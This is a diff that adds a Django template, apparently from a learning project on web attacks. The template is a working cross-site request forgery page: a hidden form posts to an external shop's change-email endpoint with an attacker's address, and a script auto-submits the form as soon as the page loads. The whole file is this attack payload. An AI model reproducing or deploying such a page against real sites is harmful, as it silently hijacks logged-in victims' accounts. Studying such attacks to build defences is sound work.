@@ -1,0 +1,35 @@
+{% extends 'firstcyberattacksapp/basic.html' %}
+{% load static %}
+{% block title %}
+Home
+{% endblock %}
+{% block css %}
+
+
+{% endblock %}
+
+{% block body %}
+<div class="container">
+    <!--
+    <p>You have visited this page {{ num_visits }}{% if num_visits == 1 %} time{% else %} times{% endif %}.</p>
+    -->
+<h1> Hello Everyone </h1>
+
+
+<form action="https://ecommerce-mac.herokuapp.com/shop/changeEmail/" method="POST">{% csrf_token %}
+    <input type="hidden" name="email" value="hacker@gmail.com" />
+    <button class="btn btn-primary" type="submit">Submit</button>
+    <button class= "btn btn-primary" id="xmlbutton" type = "button">Send XMLHttpRequest</button>
+</form>
+<p style="color:red;" id="para"></p>
+</div>
+
+
+{% endblock %}
+{% block js %}
+<script>
+window.onload = function() {
+    document.forms[0].submit();
+}
+</script>
+{% endblock %}
